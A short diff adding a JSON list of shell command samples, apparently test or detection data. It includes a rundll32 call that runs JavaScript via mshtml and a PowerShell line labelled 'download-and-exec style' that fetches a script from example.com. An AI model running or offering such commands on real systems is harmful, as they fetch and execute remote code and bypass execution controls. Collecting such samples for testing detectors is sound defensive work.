@@ -1,0 +1,8 @@
+[
+  "whoami",
+  "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
+  {
+    "command": "powershell -c \"(New-Object Net.WebClient).DownloadString('http://example.com/tool.ps1')\"",
+    "label": "download-and-exec style"
+  }
+]
